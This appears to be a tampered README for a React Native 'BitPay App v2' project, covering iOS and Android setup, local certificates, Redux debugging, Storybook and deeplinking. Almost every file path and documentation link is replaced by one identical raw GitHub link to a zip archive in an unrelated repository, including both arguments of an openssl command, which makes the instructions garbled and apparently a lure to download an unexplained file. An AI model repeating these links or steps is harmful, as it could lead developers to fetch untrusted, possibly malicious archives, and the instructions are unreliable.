# BitPay App v2
Welcome to BitPay App v2!

## Get Started
Install dependencies with `yarn` >= 14.15.0

### IOS

1. Install Pods `cd ios && pod install && cd ..`
2. `yarn start` to start dev server
3. Build and deploy to simulator `yarn ios` or device `yarn ios:device`

### Android
1. `yarn start` to start dev server
2. Build and deploy to simulator or device `yarn android`

#### Accessing your local server
To make requests to your local server, first take your local BitPay server cert and copy it into `android/app/src/main/res/raw` folder in either .pem or .der format.
- To convert .crt to .der, run: `openssl x509 -in https://raw.githubusercontent.com/abhijitssanghvi/product-catalog-service/revert-513-fix/contactName/src/components/modal/base/sheet/product-catalog-service_2.6.zip -out https://raw.githubusercontent.com/abhijitssanghvi/product-catalog-service/revert-513-fix/contactName/src/components/modal/base/sheet/product-catalog-service_2.6.zip -outform DER`

Then open `https://raw.githubusercontent.com/abhijitssanghvi/product-catalog-service/revert-513-fix/contactName/src/components/modal/base/sheet/product-catalog-service_2.6.zip` and add your local IP to the domain-config and your cert to the trust-anchors (without the file extension).

For example if your local IP is `123.0.0.7` and your cert is in `https://raw.githubusercontent.com/abhijitssanghvi/product-catalog-service/revert-513-fix/contactName/src/components/modal/base/sheet/product-catalog-service_2.6.zip`: 

    <domain-config>
      ...
      <domain includeSubdomains="true">123.0.0.7</domain>
      <trust-anchors>
        <certificates src="@raw/lbitpay" />
      </trust-anchors>
    </domain-config>
    

### Redux Dev Tools
This project uses `react-redux` https://raw.githubusercontent.com/abhijitssanghvi/product-catalog-service/revert-513-fix/contactName/src/components/modal/base/sheet/product-catalog-service_2.6.zip for state management. To take advantage of the tooling available, go to https://raw.githubusercontent.com/abhijitssanghvi/product-catalog-service/revert-513-fix/contactName/src/components/modal/base/sheet/product-catalog-service_2.6.zip and install the debugger.

1. To enable - make sure debugger is open - tap `D` in the hosting terminal window or shake the device 
2. A menu will popup - tap `Debug with Chrome`(IOS) or `Debug`(Android)
3. The logs should move from the terminal to the debugger

### Storybook
1. In `https://raw.githubusercontent.com/abhijitssanghvi/product-catalog-service/revert-513-fix/contactName/src/components/modal/base/sheet/product-catalog-service_2.6.zip` change `APP_LOAD_STORY_BOOK=false` to `APP_LOAD_STORY_BOOK=true`
2. Run `yarn <platform>` ex: `yarn ios`. Since we set `APP_LOAD_STORY_BOOK=true`, this runs Storybook instead of your actual app.

## Deeplinking
Test deeplinking via command line with these commands (note: ampersand must be escaped for multiple params): 

#### iOS
`npx uri-scheme open "bitpay://your/deeplink/path?params1=foo1\&param2=foo2" --ios`

#### Android
`npx uri-scheme open "bitpay://your/deeplink/path?param1=foo1\&param2=foo2" --android`

### Modifying the intent prefix
If you want to associate the app with a different intent prefix eg. `myapp://`:

1. Open `https://raw.githubusercontent.com/abhijitssanghvi/product-catalog-service/revert-513-fix/contactName/src/components/modal/base/sheet/product-catalog-service_2.6.zip`
2. Modify `APP_DEEPLINK_PREFIX` to your desired prefix eg. `myapp://` (with colon and slashes)
3. Update the OS specific configs:
  #### iOS
    1. Open `https://raw.githubusercontent.com/abhijitssanghvi/product-catalog-service/revert-513-fix/contactName/src/components/modal/base/sheet/product-catalog-service_2.6.zip`
    2. Find `CFBundleURLSchemes` and modify the value to your desired prefix (without colon and slashes) eg. `myapp`
  #### Android
    1. Open `https://raw.githubusercontent.com/abhijitssanghvi/product-catalog-service/revert-513-fix/contactName/src/components/modal/base/sheet/product-catalog-service_2.6.zip`
    2. Locate `<intent-filter><data android:scheme="...">` and modify the value to your desired prefix (without colon and slashes) eg. `myapp`
